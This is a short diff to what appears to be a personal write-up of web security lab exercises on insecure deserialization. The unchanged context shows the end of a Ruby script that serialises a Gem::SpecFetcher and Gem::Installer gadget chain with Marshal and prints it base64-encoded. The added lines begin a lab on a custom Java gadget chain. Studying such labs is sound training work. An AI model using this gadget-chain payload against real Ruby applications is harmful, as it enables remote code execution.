@@ -254,3 +254,5 @@ payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
 require 'base64'
 puts Base64.strict_encode64(payload)
 ```
+#### Lab: Developing a Custom Gadget Chain for Java Deserialization
+- I went ahead and opened the hint for this lab, as I knew we were stepping up quite a bit in difficulty. 
